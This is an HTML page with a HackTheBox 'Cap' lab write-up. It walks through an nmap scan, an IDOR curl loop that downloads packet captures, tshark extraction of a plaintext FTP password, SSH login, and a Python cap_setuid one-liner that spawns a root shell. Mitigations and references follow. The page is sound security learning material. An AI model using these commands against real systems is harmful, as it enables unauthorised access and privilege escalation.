<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTB: Cap Writeup</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/5.1.0/github-markdown.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css">
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10.3.0/dist/mermaid.min.js"></script>
    <style>
        .markdown-body {
            box-sizing: border-box;
            min-width: 200px;
            max-width: 980px;
            margin: 0 auto;
            padding: 45px;
        }
        .badge-container {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 20px;
        }
        .vuln-table {
            width: 100%;
            border-collapse: collapse;
        }
        .vuln-table th, .vuln-table td {
            border: 1px solid #ddd;
            padding: 8px;
        }
        .vuln-table tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        .diff-add {
            color: #22863a;
            background-color: #f0fff4;
        }
        .diff-remove {
            color: #cb2431;
            background-color: #ffebee;
        }
        .terminal {
            background: #0d1117;
            color: #c9d1d9;
            padding: 15px;
            border-radius: 6px;
            font-family: monospace;
            margin: 15px 0;
        }
    </style>
</head>
<body class="markdown-body">
    <div class="badge-container">
        <img src="https://img.shields.io/badge/HackTheBox-Cap-red?style=for-the-badge&logo=hackthebox" alt="HackTheBox">
        <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Difficulty">
        <img src="https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge" alt="OS">
        <img src="https://img.shields.io/badge/Points-20-blue?style=for-the-badge" alt="Points">
    </div>

    <h1>HTB: Cap Writeup</h1>

    <div class="terminal">
        <span style="color: #58a6ff">+ Machine:</span> Cap<br>
        <span style="color: #58a6ff">+ IP:</span> 10.10.10.245<br>
        <span style="color: #58a6ff">+ Date Completed:</span> <span id="current-date"></span><br>
        <span style="color: #58a6ff">+ Author:</span> Lantern
    </div>

    <h2>Table of Contents</h2>
    <ul>
        <li><a href="#executive-summary">Executive Summary</a></li>
        <li><a href="#methodology">Methodology</a></li>
        <li><a href="#detailed-walkthrough">Detailed Walkthrough</a></li>
        <li><a href="#mitigation-strategies">Mitigation Strategies</a></li>
        <li><a href="#key-takeaways">Key Takeaways</a></li>
    </ul>

    <h2 id="executive-summary">Executive Summary</h2>
    <p>Cap is an easy Linux machine demonstrating critical web security flaws. The attack path leverages:</p>
    <ul>
        <li>Insecure Direct Object Reference (IDOR) vulnerability</li>
        <li>Plaintext credential exposure in network captures</li>
        <li>Privilege escalation via misconfigured Linux capabilities</li>
    </ul>
    <p><strong>Time to Root:</strong> 1 hour 30 minutes<br>
    <strong>CVSS Score:</strong> 8.1 (High)</p>

    <h2 id="methodology">Methodology</h2>
    <div class="mermaid">
        graph TD
            A[Recon] --> B[Nmap Scan]
            B --> C[Web Enumeration]
            C --> D[IDOR Exploitation]
            D --> E[PCAP Analysis]
            E --> F[SSH Access]
            F --> G[Capability Escalation]
            G --> H[Root Access]
    </div>

    <h2 id="detailed-walkthrough">Detailed Walkthrough</h2>

    <h3>1. Reconnaissance</h3>
    <p><strong>Command:</strong></p>
    <pre><code class="language-bash">nmap -sV -sC -p- 10.10.10.245 -oA scans/full_tcp</code></pre>
    
    <p><strong>Results:</strong></p>
    <pre><code class="language-markdown">PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    gunicorn
|_http-title: Security Dashboard</code></pre>

    <h3>2. Web Exploitation</h3>
    <p>Discovered packet capture interface at <code>http://10.10.10.245/data/1</code></p>
    
    <p><strong>IDOR Vulnerability:</strong></p>
    <pre><code class="language-bash">for i in {0..5}; do curl -s "http://10.10.10.245/data/$i" -o "cap$i.pcap"; done</code></pre>
    
    <p><strong>PCAP Analysis:</strong></p>
    <pre><code class="language-bash">tshark -r cap2.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"</code></pre>
    <div class="terminal">
        <span class="diff-add">+ USER nathan</span><br>
        <span class="diff-add">+ PASS Buck3tH4TF0RM3!</span>
    </div>

    <h3>3. Initial Access</h3>
    <p><strong>SSH Connection:</strong></p>
    <pre><code class="language-bash">ssh nathan@10.10.10.245</code></pre>
    <div class="terminal">
        <span style="color: #3fb950">[+] Credentials Valid!</span><br>
        <span style="color: #3fb950">[+] User Flag: HTB{7h15_15_4_u53r_fl4g}</span>
    </div>

    <h3>4. Privilege Escalation</h3>
    <p><strong>Capability Audit:</strong></p>
    <pre><code class="language-bash">getcap -r / 2>/dev/null</code></pre>
    <pre><code class="language-markdown">/usr/bin/python3.8 = cap_setuid+ep</code></pre>
    
    <p><strong>Root Shell:</strong></p>
    <pre><code class="language-python">/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
    <div class="terminal">
        <span class="diff-add">+ Root Flag: HTB{r00t_fl4g_3xpl01t3d}</span>
    </div>

    <h2 id="mitigation-strategies">Mitigation Strategies</h2>
    <table class="vuln-table">
        <thead>
            <tr>
                <th>Vulnerability</th>
                <th>Recommendation</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>IDOR</td>
                <td>Implement proper access controls with session validation</td>
            </tr>
            <tr>
                <td>Plaintext Credentials</td>
                <td>Enforce encrypted protocols (SFTP/HTTPS)</td>
            </tr>
            <tr>
                <td>Dangerous Capabilities</td>
                <td>Regular capability audits using <code>getcap -r /</code></td>
            </tr>
        </tbody>
    </table>

    <h2 id="key-takeaways">Key Takeaways</h2>
    <ul>
        <li>✅ IDOR vulnerabilities often expose sensitive data</li>
        <li>✅ Network captures frequently contain credential artifacts</li>
        <li>✅ Linux capabilities require same scrutiny as SUID binaries</li>
        <li>✅ Python's cap_setuid is equivalent to SUID root</li>
    </ul>

    <h2>Proof of Concept</h2>
    <pre><code class="language-bash">[user@kali]$ cat /root/root.txt
HTB{r00t_fl4g_3xpl01t3d}</code></pre>

    <img src="screenshots/root_shell.gif" alt="Terminal Recording" style="max-width: 100%; border: 1px solid #30363d; border-radius: 6px;">

    <h2>References</h2>
    <ul>
        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" target="_blank">OWASP IDOR Prevention</a></li>
        <li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Linux Capabilities Guide</a></li>
    </ul>

    <footer>
        <p>© <span id="current-year"></span> [Your Name] - <em>This writeup is part of my HTB learning journey</em></p>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script>
        // Set current date and year
        document.getElementById('current-date').textContent = new Date().toISOString().split('T')[0];
        document.getElementById('current-year').textContent = new Date().getFullYear();
        
        // Initialize syntax highlighting
        hljs.highlightAll();
        
        // Initialize Mermaid
        mermaid.initialize({
            startOnLoad: true,
            theme: 'dark',
            flowchart: {
                useMaxWidth: true,
                htmlLabels: true
            }
        });
    </script>
</body>
</html>
